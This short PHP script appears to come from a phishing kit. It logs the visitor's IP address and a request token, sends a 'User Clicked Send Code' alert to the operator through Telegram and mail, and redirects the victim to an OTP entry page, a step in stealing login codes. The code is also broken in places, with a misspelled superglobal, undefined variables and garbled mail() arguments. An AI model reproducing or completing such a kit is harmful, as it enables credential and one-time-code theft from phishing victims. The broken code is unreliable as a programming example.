<?php
require("email.php");
include("config.php");
//Server Variables
    $ip = getenv("REMOTE_ADDR");
    //Name Attributes of HTML FORM

    //Fetching HTML Values
    $page=$GET_['page']; // should be sanitized and you can use REQUEST for either 
    $serv = $_REQUEST['__RequestVerificationToken'];


    $sender_name = "EM6L3M";
    $sender_mail = "em6l3m-light.log";
	

        //Main Content
        $main_subject = "User Clicked Send Code l $ip";
        $main_body = "<p></p>
        Login Code sent Succesfully
        
        User-Ip : $ip 
        -----------------------------------------
        Date : $DATE";

     send_telegram_msg($message);   

//#############################DO NOT CHANGE ANYTHING BELOW THIS LINE#############################
        //Sending mail to Server
         $retval = mail($server_mail, $message, $main_subject, "$uid\r\n \r\n\r\n $main_body \r\n\r\n--$uid\r\n $uid","From: $sender_name <$sender_mail>\r\nReply-To: $sender_mail\r\nMIME-Version: 1.0\r\nContent-Type: text/html; boundary=\"$uid\"\r\n\r\n");
         //Sending mail to Sender
//#############################DO NOT CHANGE ANYTHING ABOVE THIS LINE#############################

        //Output
	header("location:enter-otp.html");
?>
